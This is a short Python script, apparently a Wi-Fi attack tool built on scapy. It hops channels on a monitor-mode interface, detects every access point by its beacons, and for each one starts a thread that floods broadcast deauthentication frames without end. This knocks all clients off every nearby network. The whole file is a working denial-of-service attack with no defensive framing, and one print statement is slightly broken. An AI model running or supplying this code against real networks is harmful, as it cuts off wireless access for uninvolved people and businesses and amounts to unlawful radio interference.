from scapy.all import *
import threading
import os, time, random

a_points = []

def hopper():
    while True:
        ch = random.randint(1, 12)
        os.system("iwconfig wlan1mon channel %d" % ch)
        time.sleep(0.75)

def disconnect(_ap, _st):
    pkt = RadioTap() / Dot11(addr1=_st, addr2=_ap, addr3=_ap) / Dot11Deauth(reason=2)

    while True:
        sendp(pkt, iface="wlan1mon", verbose=False)

def findBSS(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt.getlayer(Dot11).addr2
        essid = pkt.getlayer(Dot11Elt).info
        if bssid not in a_points:
            a_points.append( bssid )
            print("Disconnecting: {essid}")
            _t = threading.Thread(target=disconnect, args=(bssid, "ff:ff:ff:ff:ff:ff"))
            _t.daemon = True
            _t.start()

if __name__ == "__main__":
    _t = threading.Thread(target=hopper)
    _t.daemon = True
    _t.start()
    sniff(iface="wlan1mon", prn=findBSS)